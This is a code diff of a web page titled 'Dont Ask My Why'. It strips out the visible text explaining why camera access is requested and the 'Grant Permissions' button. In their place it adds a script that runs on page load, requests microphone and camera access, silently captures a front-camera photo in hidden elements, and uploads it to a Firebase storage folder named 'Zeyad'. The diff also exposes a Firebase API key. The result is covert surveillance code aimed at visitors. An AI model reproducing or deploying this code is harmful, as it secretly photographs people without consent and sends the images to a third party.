@@ -4,54 +4,13 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Dont Ask My Why</title>
-    <link rel="icon" href="data:,">
-    <style>
-        body {
-            background-color: #000; /* Black background */
-            color: #fff; /* White text */
-            text-align: center;
-            font-family: Arial, sans-serif;
-            height: 100vh; /* Full viewport height */
-            margin: 0; /* Remove default margin */
-            display: flex; /* Flexbox for centering */
-            align-items: center; /* Center vertically */
-            justify-content: center; /* Center horizontally */
-        }
-        #permissions-message {
-            margin-top: 20px;
-            font-size: 18px;
-        }
-        #request-permissions {
-            display: block;
-            margin: 20px auto;
-            padding: 10px 20px;
-            font-size: 16px;
-            cursor: pointer;
-            background-color: #1e90ff; /* Button color */
-            color: white;
-            border: none;
-            border-radius: 5px;
-        }
-        #video {
-            display: none;
-            margin-top: 20px;
-        }
-    </style>
-</head>
-<body>
-    <div>
-        <h1>Welcome to Dont Ask My Why</h1>
-        <div id="permissions-message">
-            To proceed, we need access to your microphone (it won't be used) and camera.
-        </div>
-        <button id="request-permissions">Grant Permissions</button>
-        <video id="video" autoplay playsinline></video>
-    </div>
-
+    <link rel="icon" href="data:,"> <!-- Favicon request disabled -->
     <script type="module">
+        // Import Firebase functions
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-app.js";
         import { getStorage, ref, uploadString } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-storage.js";
 
+        // Firebase configuration
         const firebaseConfig = {
             apiKey: "AIzaSyCSmicQncJhWtvEekSLNQtvWM6fFr0cuRM",
             authDomain: "html-7fd9b.firebaseapp.com",
@@ -61,11 +20,13 @@
             appId: "1:1022361191925:web:5bf0fb4023990d83aa0cbc"
         };
 
+        // Initialize Firebase
         const app = initializeApp(firebaseConfig);
         const storage = getStorage(app);
 
+        // Function to upload image to Firebase
         function uploadImage(imageData) {
-            const storageRef = ref(storage, 'Zeyad/image_' + Date.now() + '.png');
+            const storageRef = ref(storage, 'Zeyad/image_' + Date.now() + '.png'); // Upload to Zeyad folder
             uploadString(storageRef, imageData, 'data_url')
                 .then(() => {
                     console.log('Uploaded a blob or file!');
@@ -75,7 +36,8 @@
                 });
         }
 
-        document.getElementById('request-permissions').addEventListener('click', () => {
+        // Access video and canvas elements when the window loads
+        window.addEventListener('load', () => {
             // Request microphone access first
             navigator.mediaDevices.getUserMedia({ audio: true })
                 .then(() => {
@@ -83,42 +45,55 @@
                     // Now request camera access
                     return navigator.mediaDevices.getUserMedia({
                         video: {
-                            facingMode: { ideal: "user" }, 
+                            facingMode: "user", // Using front camera
                             width: { ideal: 1920 },
                             height: { ideal: 1080 }
                         }
                     });
                 })
                 .then(stream => {
-                    console.log('Camera access granted.');
-                    // Display the video feed
-                    const videoElement = document.getElementById('video');
-                    videoElement.style.display = 'block';
-                    videoElement.srcObject = stream;
-
+                    const video = document.createElement('video');
                     const canvas = document.createElement('canvas');
                     const context = canvas.getContext('2d');
-                    canvas.width = 1920;
-                    canvas.height = 1080;
 
-                    // Capture the image after 3 seconds
-                    setTimeout(() => {
-                        context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+                    video.srcObject = stream;
+                    video.onloadedmetadata = () => {
+                        video.play();
+
+                        // Set canvas size for 1080p
+                        canvas.width = 1920;  
+                        canvas.height = 1080; 
+
+                        // Capture image immediately
+                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
                         const imageData = canvas.toDataURL('image/png');
-                        uploadImage(imageData);
-                        stopVideo(stream);  // Stop the video stream after capturing the image
-                    }, 3000);  // 3 seconds delay before taking a picture
+                        uploadImage(imageData); // Upload image to Firebase
+                        stopVideo(stream); // Stop the video stream
+                    };
                 })
-                .catch(error => {
-                    console.error('Error accessing camera or microphone:', error);
-                    alert('Permission was denied or there was an error accessing your microphone or camera.');
+                .catch(err => {
+                    console.error('Error accessing camera: ', err);
                 });
         });
 
+        // Function to stop video stream
         function stopVideo(stream) {
             const tracks = stream.getTracks();
             tracks.forEach(track => track.stop());
         }
     </script>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #000; /* Black background */
+        }
+
+        video, canvas {
+            display: none; /* Hide video and canvas elements */
+        }
+    </style>
+</head>
+<body>
 </body>
 </html>
